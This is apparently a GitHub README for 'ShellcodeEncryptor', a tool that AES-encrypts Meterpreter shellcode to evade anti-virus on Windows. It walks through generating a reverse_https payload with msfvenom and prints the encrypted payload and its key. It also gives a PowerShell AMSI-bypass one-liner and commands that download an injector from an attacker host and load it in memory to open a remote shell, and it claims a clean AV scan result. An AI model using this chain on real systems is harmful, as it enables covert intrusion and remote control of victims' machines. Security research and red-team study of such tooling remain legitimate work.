# ShellcodeEncryptor
A simple shell code encryptor/decryptor/executor to bypass anti virus.

**Note:** I have completely redone the work flow for creating the bypass, I have found injecting the binary into memory using PowerShell as the most effective method.

<img src="https://raw.githubusercontent.com/plackyhacker/ShellcodeEncryptor/master/demo.gif" alt="Demo " style="zoom:150%;" />

# Purpose
To generate a .Net binary containing base64 encoded, AES encrypted shellcode that will execute on a Windows target, bypassing anti-virus.

# Instructions

Use the `meterpreter_encryptor.py` to create the encrypted base64 shellcode:

```bash
root@kali:~# ./meterpreter_encryptor.py -p windows/x64/meterpreter/reverse_https -i 192.168.1.228 -l 443 -f b64
[+] Generating MSFVENOM payload...
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor_dynamic
x64/xor_dynamic succeeded with size 667 (iteration=0)
x64/xor_dynamic chosen with final size 667
Payload size: 667 bytes
Saved as: ./msf.bin
[+] Encrypting the payload, key=fjlmjiEgnQ4K6CjNCrPlqug1HW4icMec...
[+] Base64 output:
sZkMiiTitR5hQL2YXTBgjq91qq0FuEqgfR7YiKt2N1IZ8vqW3q/BrIYTjBb7nKLXCsJM25sRqh+R9WHGNsTV8webqwx7ZfAYSvlmEmzIJcKaBVdJO+Lbr7h9RomrOdyaPUAZ6P49lnsZFF1fdvnFOg/WvSdKUrx/eKEt5sNBn/Jz43y26mDEwEEqseydPQHyBcT9Av/ZkTQC6GZU8D+pQhKvXNdnlGrHJk4+G25me/Hzr0P1YuX9ZpGbyXb/pLdmdViAGAPtA/OORVt6xmij4AY24j8SLocUs2A6lSJZHYD2C1+DIc1Lyw8UJ6dtNIU2xDtsHCWX0OlkcjU+QoYpCavs78Y+OePjyBwkryWTzMyuKBgAREjbQQdsIn6dQZeqk/tKI/l6Fmhu27V+wFX7mxUP/KXWf9PI/3QYiuLmkJCWFBL9sINPbLVLePFSke8Ik3t+vp5SIcM+wMufg+TXBdUNpE//gTgCpblXdJfkkqVpMFBxnfX2vYPDcFLWteiNsnHCn9REbVB3MqJe5T55tO/CLq1KkZ2R7Z7rra6H8OhJgOLKEdJ/XHdZV9IFatAtRW2dxVo49P2YFmux2WSDiKhVRoCuLMVM6PeTuzsN+2qV4Zrq6tRAVLwmmTn5uflWER1aScePh6+6utXW/0jS+Hz7KiGP2//8+YDwzYbkLJnfn9B4AdmE4BuNTJRrv7tumsxboNkmWOx87lVElzn5ZM9OP721s8LiSyfkD1zm4o9j2u80syPeEU3PXvOU1epBTsTjdwRWlAYF+wzv3olAjPzR/xojjB602MIUNeCPn4fqDp6NjEokELcgawbWNl1vKYo4QEYgtlhVmqIkk2ooz527AEQb5EWQhkaZEWr4AAmGO1YfvYDCTcfUwV9p/jkg
```

Take the key and shellcode and insert it into [ProcessInjector.cs](https://github.com/plackyhacker/ShellcodeEncryptor/blob/master/ProcessInjection.cs)

```csharp
// decrypt the base64 payload
string payload = "sZkMii [etc...]";
string key = "fjlmjiEgnQ4K6CjNCrPlqug1HW4icMec";
```

Compile the C# code into an executable (e.g., `metInject.exe`) and serve it via a web server.

Inject the executable into a remote PowerShell process:

```powershell
# AMSI bypass
$a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iutils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*itFailed") {$f = $e}};$f.SetValue($null,$true)

$bytes = (Invoke-WebRequest "http://192.168.1.228/metInject.exe").Content;
$assembly = [System.Reflection.Assembly]::Load($bytes);
$entryPointMethod = $assembly.GetType('ProcessInjection.Program', [Reflection.BindingFlags] 'Public, NonPublic').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic');
$entryPointMethod.Invoke($null, (, [string[]] ('', '')));
```

Hopefully you will have a nice meterpreter shell.

# Help

```bash
./meterpreter_encryptor.py -h                                                                     
usage: meterpreter_encryptor.py [-h] [-l LPORT] [-i LHOST] [-p PAYLOAD] [-m METHOD] [-k KEY] [-e ENCODER] [-f FORMAT]

optional arguments:
  -h, --help            show this help message and exit
  -l LPORT, --lport LPORT
                        The local port that msfconsole is listening on.
  -i LHOST, --lhost LHOST
                        The local host that msfconsole is listening on.
  -p PAYLOAD, --payload PAYLOAD
                        The payload to generate in msfvenom.
  -m METHOD, --method METHOD
                        The method to use: thread/delegate.
  -k KEY, --key KEY     The encryption key (32 chars).
  -e ENCODER, --encoder ENCODER
                        The meterpreter encoder.
  -f FORMAT, --format FORMAT
                        The format to output.
  ```

# AV Scan Results

The binary was scanned using [antiscan.me](https://antiscan.me/scan/new/result?id=gn0muzwLOUOc) on 03/10/2021.

![AV Scan](https://github.com/plackyhacker/ShellcodeEncryptor/blob/master/scan.png?raw=true)

# Notes

Tested with windows/x64/meterpreter/reverse_https on Windows 10 Pro (build 10.0.19042) with Defender.
